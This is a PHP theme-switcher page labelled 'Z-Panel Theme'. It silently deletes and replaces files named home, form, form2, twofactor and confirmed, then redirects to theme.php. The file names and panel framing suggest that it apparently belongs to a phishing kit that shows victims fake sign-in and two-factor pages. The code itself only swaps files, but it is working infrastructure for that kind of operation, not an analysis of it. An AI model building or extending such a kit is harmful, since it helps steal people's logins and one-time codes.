<?php
error_reporting(0);
include ("../../app/session/session.php"); 
$DeleteFıles  = ("../../home.php");
$DeleteFıles2 = ("../../form.php");
$DeleteFıles3 = ("../../form2.php");
$DeleteFıles4 = ("../../twofactor.php");
$DeleteFıles5 = ("../../confirmed.php");
unlink($DeleteFıles);
unlink($DeleteFıles2);
unlink($DeleteFıles3);
unlink($DeleteFıles4);
unlink($DeleteFıles5);
copy("../../app/theme/sloker2/home.php","../../home.php");
copy("../../app/theme/sloker2/form.php","../../form.php");
copy("../../app/theme/sloker2/form2.php","../../form2.php");
copy("../../app/theme/sloker2/twofactor.php","../../twofactor.php");
copy("../../app/theme/sloker2/confirmed.php","../../confirmed.php");
?>
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Z-Panel Theme</title>
  <link rel='stylesheet' href='https://use.fontawesome.com/releases/v5.6.1/css/all.css'><link rel="stylesheet" href="../../assets/install/main.css">
</head>
<body>
<div id="wrapper">
  <div id="mouse"></div>
  <div class="loader">
  </div>
  <div class="loading-bar">
    <div class="progress-bar"></div>
  </div>
  <div class="status">
    <div class="state"></div>
    <div class="percentage"></div>
  </div>
</div>
<?php header("Refresh:5; url=theme.php"); ?>
<script src=""></script>
</body>
</html>
